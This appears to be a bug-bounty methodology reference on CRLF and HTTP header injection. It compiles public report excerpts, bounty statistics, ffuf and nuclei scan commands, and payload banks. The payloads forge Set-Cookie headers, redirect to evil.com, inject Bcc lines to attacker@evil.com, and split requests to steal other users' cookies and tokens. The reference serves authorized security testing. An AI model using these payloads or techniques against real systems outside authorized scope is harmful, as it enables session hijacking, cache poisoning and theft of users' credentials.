# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Inject %0d%0a into params reflected in headers, redirects, or filenames.
- Test header injection for XSS, cache poisoning, and smuggling.
- Check email header injection in contact/notification forms.

### Deeper checklist

- Inject `%0d%0a` into params reflected in headers, redirects, or filenames.
- Test header injection for XSS, cache poisoning, and request smuggling.
- Try encoded variants and unicode line separators.
- Check email header injection in contact/notification forms.
- Demonstrate header control or response splitting.

### A. Discovery checklist — concrete places, params, headers, file types to look

- Response-header sinks: `Location`/redirect params (`redirect`, `next`, `url`, `return`), `Set-Cookie` / preference values, `Content-Type` (`?type=`), `Content-Disposition` / `filename`, custom reflected headers, and `X-Forwarded-*` echoes at a proxy.
- Request-header sinks: URL path segments reflected by an upstream proxy, session cookies echoed into a rewritten path (payment provider case in the 2026 PortSwigger research), and any header built from user input in curl/libcurl-style clients.
- Log-file sinks: newline injection into user-agent, referer, username, or filename → log forging (CWE-117); useful for confusion/delaying analysis rather than direct impact.
- SMTP/header contexts: email `subject`, `from`, `to`, and `filename` fields that are copied into mail headers.
- Classic Nginx misconfiguration to fingerprint: `proxy_pass http://backend$uri;` or `return 302 https://example.com$uri;` — Nginx URL-normalises `$uri`, decoding `%0d%0a` before forwarding upstream. OpenResty/Tengine inherit the same flaw.
- HTTP/2 downgrade surfaces: any front-end that folds header values into an HTTP/1.1 request; CRLF in an HTTP/2 header value can create a second header on the back end.
- 2025-2026 case studies worth modelling: Pi-hole web GHSA-5v79-p56f-x7c4 (session fixation + response splitting), curl `Curl_add_custom_headers` H1 #3484431 (request smuggling/SSRF), TikTok cookie tossing, telecom access-token theft ($20k), clothing-store account takeover via injected `Transfer-Encoding` ($2.2k).

## Signals and surfaces

### Signal

- Reports: **168** · paid: **25**
- Median bounty **$400** · p90 **$1,800** · max **$5,000** · total **$18,960**
- Median upvotes **11**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Aiven Ltd | 1 | $5,000 | 72 |
| GitHub Security Lab | 2 | $3,300 | 17 |
| Airbnb | 1 | $2,500 | 37 |
| Internet Bug Bounty | 6 | $2,100 | 395 |
| X / xAI | 5 | $1,680 | 656 |
| Shopify | 2 | $1,300 | 141 |
| New Relic | 5 | $500 | 138 |
| Urban Company | 1 | $500 | 33 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`redirect` `next` `url` `filename` `email` `subject` `log`

## Techniques, payloads and bypasses

### Payloads & probes

- `%0d%0aSet-Cookie:%20x=1` `%0aLocation:%20//evil.com`
- `%E5%98%8A%E5%98%8D` unicode CRLF
- `\r\n` in filenames and log lines

### Payload bank

**20 curated payloads** in 2 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Bypass tricks

- Double encoding and unicode line separators.
- Use header folding and whitespace variations.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **CRLF injection** — `#446271` · X / xAI · $0 · ▲439
  > https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0atest:tested
- **HTTP Response Header Injection in shopify/pitchfork + Rack 3** — `#2279572` · Shopify · $800 · ▲136
  > Header injection succeeds in case of `r\n` and `\n`.
- **CRLF injection leads to internal XSS on PangleGlobal** — `#2189960` · TikTok · $0 · ▲97
  > A cross-site scripting vulnerability was found on a Pangle endpoint due to CRLF injection on the 'file name' parameter.
- **CRLF to XSS & Open Redirection** — `#2012519` · TikTok · $0 · ▲97
  > This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect.
- **Creating malformed URLs via new line character in-between two URLs leads to misrepresented hyperlinks in Tweets/DMs** — `#712979` · X / xAI · $0 · ▲96
  > This allows an attacker to create realistic looking phishing URLs via combining `attacker.com` + `%0d` + `website.com`.
- **Grafana RCE via SMTP server parameter injection** — `#1200647` · Aiven Ltd · $5,000 · ▲72
  > Using this CRLF-injection, the `rendering args` of grafana image renderer can be modified which leads to code execution on the Grafana server.
- **jitsi-meet: Prosody/Jigasi missing header whitelist in mod_filter_iq_rayo allows arbitrary SIP header injection and Caller ID spoofing** — `#3789570` · 8x8 · $100 · ▲72
  > The Prosody filter implemented an incomplete blocklist that stripped only three specific internal header names (`X-outbound-call-initiator-user`, `X-outbound-call-initiator-group`, and `JvbRoomName` on visitor nodes) from client-supplied Rayo `<dial ` IQ…
- **Host Header Injection - internal.qa.delivery.indrive.com** — `#2076786` · inDrive · $0 · ▲66
  > User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
- **Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection via "redirect_uri" parameter** — `#2147132` · Mozilla · $200 · ▲61
  > or (with true redirect): https://bugzilla.mozilla.org/oauth/authorize?client id=&redirect uri=\\name.tld%0d%0axxx:something&response type=code
- **HTTP Response Splitting (CRLF injection) in report_story** — `#52042` · X / xAI · $0 · ▲59
  > https://twitter.com/i/safety/report story?next view=report story start&source=reporttweet&reported user id=1&reporter user id=1&is media=true&is promoted=true&reported tweet id=%E5%98%8A%E5%98%8DSet-Cookie:%20test
- **Host Header Injection leads to Open Redirect and Content Spoofing or Text Injection.** — `#1444675` · Omise · $300 · ▲50
  > When an application does not properly handle user-supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user.
- **CRLF Injection in `--proxy-header` allows extra HTTP headers (CWE-93)** — `#3133379` · curl · $0 · ▲42
  > There is a bug in `curl` where a user can inject new HTTP headers into a proxy request by using special characters in the `--proxy-header` option.
- **[m.airbnb.com] CRLF Injection** — `#197279` · Airbnb · $2,500 · ▲37
  > By using a URL-escaped character sequence, bobrov was able to inject HTTP headers into the responses of some redirects on the m.airbnb.com domain.
- **Host Header injection in oslo.io (using X-Forwarded-For header) leading to email spoofing** — `#1072277` · Logitech · $0 · ▲37
  > https://portswigger.net/web-security/host-header
- **Subdomain Takeover via Host Header Injection on www.█████** — `#2188240` · U.S. Dept Of Defense · $0 · ▲35
  > `curl -skS https://www.███████ --header "Host: ███.netlify.app"`
- **CRLF injection on www.starbucks.com** — `#858650` · Starbucks · $0 · ▲34
  > curl -i 'https://www.starbucks.com/email-prospecttg9wh%0d%0aset-cookie:foo%0d%0a%0d%0a4t6uf?requesturl=/responsibility/global-report/policies' -d 'newsletter signup email=&newsletter signup zipcode=&newsletter placement=footer' --http1.1
- **Host header injection that bypassed protection and allowed accessing multiple subdomains** — `#1783015` · Urban Company · $500 · ▲33
  > Areas affected: [App/ Website + URL/Location] https://www.urbancompany.com and it allowed accessing otherwise inaccessible subdomains https://av.urbancompany.com , https://ims.urbancompany.com , https://mesh.urbancompany.com
- **CRLF and XSS stored on ton.twitter.com** — `#191380` · X / xAI · $1,680 · ▲32
  > https://ton.twitter.com/1.1/ton/data/dm/809353163740483587/809353151434330112/O5hEYiOt.jpg%2523.html%E5%98%8A%E5%98%8Dset-cookie%3A%20auth…
- **CRLF INJECTION** — `#1038594` · U.S. General Services Administration · $0 · ▲32
  > Vulnerable url - https://www.epay.fas.gsa.gov/%0D%0ASet-Cookie:crlfinjection=crlfinjection
- **SSL options ISSUERCERT, EC_CURVES and CRLFILE silently ignored by non-OpenSSL backends** — `#3516974` · curl · $0 · ▲31
  > The bugs affect both libcurl applications (via `curl easy setopt()`) and curl command line users (via `--curves` and `--crlfile` flags).
- **ZMQ RPC Log Injection and Untrusted Payload Persistence** — `#3621606` · Monero · $0 · ▲30
  > Introduction point: commit 77986023c3 in src/rpc/daemon handler.cpp (`MDEBUG("Handling RPC request: " << request);`).
- **HTTP Response Splitting (CRLF injection) due to headers overflow** — `#53843` · X / xAI · $0 · ▲30
  > I would like to report another HTTP Response Splitting vulnerability caused by header fields "overflow" that allows attackers to inject arbitrary headers in the response.
- **SMTP Command Injection in Appointment Emails via Newlines** — `#1509216` · Nextcloud · $0 · ▲27
  > Next, a confirmation email with a confirmation link is sent to the user who booked the slot via `/var/www/nextcloud/apps/calendar/lib/Service/Appointments/BookingService.php` using the SMTP connection.
- **Host Header Injection** — `#1098948` · Kartpay · $0 · ▲27
  > For example Joomla used to write Host header to every page without HTML Encoding like this: <link href=”http:// SERVER['HOST']” which led to cross site scripting.
- **Reflected XSS using Header Injection** — `#297203` · Semrush · $0 · ▲25
  > GET /billing-admin/profile/subscription/?l=de HTTP/1.1
- **HTTP/3 Protocol Smuggling and Header Injection via CRLF in QPACK value conversion** — `#3479203` · curl · $0 · ▲24
  > Pollution of `curl easy header` API: Applications using the structured headers API to copy headers from one request to another will unwittingly propagate the malicious payload, spreading the attack deeper into internal networks.
- **CRLF Injection at vpn.bitstrips.com** — `#237357` · Snapchat · $0 · ▲24
  > As can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.
- **SMTP header injection via C-escape `\r` in the recipient display name** — `#3913007` · Nextcloud · $0 · ▲23
  > `$headers['To']`; `:384` hands it to `Mail mime`; `program/lib/Roundcube/rcube.php:1802`
- **[newscdn.starbucks.com] CRLF Injection, XSS** — `#192749` · Starbucks · $0 · ▲23
  > After sending the request through FireFox this query is saved in cache and using a small trick can be made to work it in another browser.
- **SMTP Command Injection in iCalendar Attachments to Emails via Newlines** — `#1516377` · Nextcloud · $0 · ▲22
  > Setup `/var/www/nextcloud/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php` to log SMTP commands.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 14× | `\r\n` |
| 5× | `rtsp_do()` |
| 5× | `data->set.crlf` |
| 5× | `conn_config->CRLfile` |
| 5× | `Curl_setstropt()` |
| 4× | `Curl_creader_total_length()` |
| 3× | `Mail_mimePart::encodeHeader()` |
| 3× | `cr_init_backend()` |
| 3× | `auth_digest_string_quoted()` |
| 2× | `r\n` |
| 2× | `%0d` |
| 2× | `curl_easy_setopt()` |
| 2× | `stripcslashes()` |
| 2× | `preg_match('#([^\s\x21-\x7E]){1}#')` |
| 2× | `Net_SMTP::quotedata()` |
| 2× | `http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0` |
| 2× | `rtsp_setup_request()` |
| 2× | `rtsp_header_alloc()` |
| 2× | `legit@example.com` |
| 2× | `invalid ${key} header` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Canonical response-header injection: `GET /redirect?url=/home%0d%0aSet-Cookie:%20sessionid=attacker` → a forged `Set-Cookie` line in the raw 302 response.
- Response splitting: `%0d%0a%0d%0a` closes the header block and starts a fully attacker-controlled body/response; add a matching `Content-Length: 0` on the first response so the browser treats the next as a new response.
- Encoding variants to try in order: `%0d%0a`, `%250d%250a` (double-encoded), bare `%0a` (many parsers accept bare LF per RFC 9112), `\r\n` inside JSON/API values, and Unicode-normalisation variants (WAFs often check only the literal `%0d%0a`).
- Request-header injection detection oracles (PortSwigger 2026): `GET /<urlencoded> HTTP/13.37` → `HTTP/1.1 505 Version Not Supported`; injected `Transfer-Encoding: x` → `501 Not Implemented`; injected `Expect: asdf` → `417 Expectation Failed`. A predictable anomaly status proves the injected bytes are parsed as protocol syntax.
- Request splitting / Response Queue Poisoning: inject two consecutive CRLFs plus a complete second request (`TRACE / HTTP/1.1`), then harvest other users' responses (session cookies, auth tokens) from the same connection. `Connection: keep-alive` sometimes required.
- If double-CRLF is blocked, inject a *single* header: `Transfer-Encoding: chunked` alongside the existing `Content-Length` produces a CL.TE desync; confirm with the timeout technique (`Transfer-Encoding: chunked` + truncated body → 30s hang).
- Nested response splitting CSP bypass (siunam, 2025): inject `Content-Length` and a second response whose body is a `Content-Type` + `<script>` pair, so a strict `script-src 'self'` CSP is bypassed because the script appears to come from a same-origin static path. Fixed-length Content-Length can be handled by padding with junk.
- CDN-Cache-Control trick: inject `CDN-Cache-Control: private="Location"` to make Cloudflare strip the `Location` header, allowing XSS to fire on a redirect response; combine with `Content-Type: text/html;charset=ISO-2022-JP` and escaped script tokens to evade WAF signatures.
- Reverse desync (classic 2004 response splitting): inject `Content-Length: 0` plus a second response in the *server's* reply; usually blocked today by stacked-response handling, but worth testing.
- Browser-powered desync: most CRLF-powered attacks work via `fetch()` or navigation — use `window.open()` + `location` or rapid iframe creation for connection-/IP-locked cases, enabling desync worms and HttpOnly cookie theft via HEAD/Range over-read.

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Always inspect the **raw** response in Burp (not the rendered browser view) — the browser hides exactly the byte-level structure you are proving.
- Confirm the injected header appears as its own line (`Set-Cookie: ...` etc.), not as text inside the original header value or body — that distinction separates real injection from reflection.
- A WAF 403 on `%0d%0a` is a filter hit, not a finding; try double encoding, bare LF, and Unicode-normalisation variants before concluding.
- For response splitting, prove the second response is actually parsed: the browser must render attacker content, or a cache must serve it to a second visitor. A well-formed but ignored second response is not impact.
- For request-header injection → desync, prove cross-user impact with a unique marker (own email changed, collaborator callback, stolen token from another user) rather than only an anomaly status code. Anomaly statuses prove parsing; they do not prove exploitation.
- Avoid destructive PoCs: logging every active user into your account or overwriting carts is real impact but creates noise and can end an engagement early — prefer a benign marker.
- Wait and re-poll Collaborator for delayed interactions; poll for 30-120s and use unique subdomains per sink.
- When reporting, chain the primitive to a concrete outcome: session fixation, cache poisoning, cross-user XSS/ATO, or internal token theft. Bare "header injection" is routinely downgraded.

**Encoding matrix (try every row):**
- `%0D%0A` — canonical CRLF, URL-encoded.
- `%250d%250a` — double-encoded; survives one decode, becomes CRLF after a second.
- `%0A` / `%0D` — bare LF / bare CR; many parsers accept either as a line terminator.
- `%0d%0a%0d%0a` — header block terminator (response splitting / request splitting).
- `\r\n` literal — JSON body values, log fields, SMTP headers.
- Unicode normalisation variants — defeat WAFs that only match ASCII `%0d%0a` (BlackHat USA 2025 research).
- `%c0%0d%c0%0a` — overlong UTF-8 encodings on legacy servers.

**Impact ladder for triage:**
- Low: a forged custom header echoed back with no security consequence.
- Medium: open redirect, arbitrary header injection, log forging.
- High: session fixation via forged `Set-Cookie`, CSP/frame-header override enabling clickjacking or XSS, cache poisoning of a single URL.
- Critical: response-queue poisoning / CL.TE desync stealing other users' cookies and tokens, mass cache poisoning, desync worm, HttpOnly cookie theft.

**Tooling and detection aids:**
- `crlfuzz` for parameter fuzzing; Burp's HTTP Request Header Injection scan check; the open-source `crlf-powered-desync-scanner` Burp extension and `crlf-desyncs` nuclei templates from the 2026 research.
- Hackvertor `<@urlencode_all> ... </@urlencode_all>` notation makes multi-line request-splitting payloads readable in Burp Repeater.
- Test non-path insertion points explicitly (cookies, headers, JSON fields) — the research calls these the best bet for an easy bounty because tooling covers paths well but not other locations.
- For header injection found by a scanner, PortSwigger's 2026 "one prompt" workflow is: identify the upstream injection location, validate via request splitting with unique status codes, mini-crawl for a redirect gadget (Host / X-Forwarded-Host / absolute URL), then combine prefix + gadget into the exploit.
- Always capture the raw hex of the injected bytes when reporting a request-smuggling chain — hex dumps are decisive evidence that CRLF was transmitted unsanitized (as in curl H1 #3484431).
- For log-injection variants, demonstrate the forged entry in the actual log view (or a log-shipping sink) rather than only in the request — the impact is analyst confusion and delayed detection.
- A single extra header is often enough: a forged `X-Forwarded-For`, `X-Original-URL`, or `X-Rewrite-URL` can alter upstream authorization or routing even when response splitting is blocked.

## Escalation and related chains

### Escalation chains

- CRLF -> XSS.
- CRLF -> cache poisoning.
- CRLF -> smuggling.

## Tools and wordlists

### Tools

`Burp` · `crlfuzz` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_crlf-injection.txt` | 94 |
| `~/.local/share/hackerone-reports/wordlists/params_crlf-injection.txt` | 51 |
| `~/.local/share/hackerone-reports/wordlists/payloads_crlf-injection.txt` | 20 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_crlf-injection.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_crlf-injection.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_crlf-injection.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Test params reflected in headers, redirects, filenames, and emails.

```sh
nuclei -u https://target -tags crlf \
       -severity low,medium,high,critical -rl 40 -o nuclei_crlf-injection.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/crlf -dast \
       -rl 40 -o nuclei_crlf-injection_crlf.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_crlf-injection_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class crlf-injection --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class crlf-injection
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class crlf-injection
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class crlf-injection --min-bounty 1000
```

### Related

- `hackerone-xss` (2,569 reports)
- `hackerone-request-smuggling` (101 reports)
- `hackerone-open-redirect` (385 reports)

### Related

- `xss` (2,569 reports)
- `request-smuggling` (101 reports)
- `open-redirect` (385 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/crlf-powered-desync-attacks
2. https://owasp.org/www-community/attacks/HTTP_Response_Splitting

## Additional notes

### Header injection

```text
%0d%0aSet-Cookie:%20x=1
%0aSet-Cookie:%20x=1
%0d%0aLocation:%20//evil.com
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
%0d%0aX-XSS-Protection:%200
%0d%0a%0d%0a<script>alert(1)</script>
%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
%E5%98%8A%E5%98%8DLocation:%20//evil.com
\r\nSet-Cookie: x=1
\nSet-Cookie: x=1
%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None
%0d%0aRefresh:%200%3burl=//evil.com
```

### Email / log / filename contexts

```text
%0d%0aBcc: attacker@evil.com
%0d%0aCc: attacker@evil.com
%0d%0aSubject:%20injected
a%0d%0aBcc:attacker@evil.com
file%0d%0aSet-Cookie:%20x=1.txt
line1%0d%0aline2
%0d%0a%09injected
%0d%0a%20injected
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_crlf-injection.txt` (20)

### Parameters observed

`mode` · `newsletter_placement` · `_task` · `_action` · `client_id` · `redirect_uri` · `response_type` · `next_view` · `source` · `reported_user_id` · `reporter_user_id` · `is_media` · `is_promoted` · `reported_tweet_id` · `apikeyrefresh` · `act` · `redirecturl` · `ref` · `cards_platform` · `include_cards`

### CRLF injection

`#446271` · X / xAI · $0 · medium · 2019-12-25 · ▲439
> Hello twiiter security team, on the domain ads.twitter.com http response splitting is vulnerability. PoC: https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0atest:tested Impact an attacker can set new header

### CRLF Injection in urllib

`#590020` · Internet Bug Bounty · $1,000 · medium · 2020-05-06 · ▲341
> Hi. I found CRLF Injection a few months ago. Please refer my bug issue. https://bugs.python.org/issue35906 Thank you Impact lead to SSRF. e.g. can exploit a internal redis server to send arbitrary packet data including ascii and non-ascii.

### HTTP Response Header Injection in shopify/pitchfork + Rack 3

`#2279572` · Shopify · $800 · low · 2025-03-27 · ▲136
> I have confirmed HTTP response header injection and XSS in combination of pitchfork + Rack 3. Here's where the problem is in the code. https://github.com/Shopify/pitchfork/blob/v0.10.0/lib/pitchfork/http response.rb L23C1-L33C8 When using Rack 3, \n contained in value will be displayed as is in the output.

### CRLF injection leads to internal XSS on PangleGlobal

`#2189960` · TikTok · $0 · medium · 2023-10-31 · ▲97
> A cross-site scripting vulnerability was found on a Pangle endpoint due to CRLF injection on the 'file name' parameter. This was caused by the reflection of user-supplied data without appropriate HTML escaping or output encoding and could have resulted in a JavaScript payload being injected into the above endpoint and executed within the context of the another user's browser. This vulnerability has been resolved.

### CRLF to XSS & Open Redirection

`#2012519` · TikTok · $0 · high · 2023-08-16 · ▲97
> Due to inadequate input validation, it could have been possible to inject CRLF (HTTP Response Splitting) into the parameter " hack redirect now " on a TikTok seller endpoint. This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect. This vulnerability has been resolved.
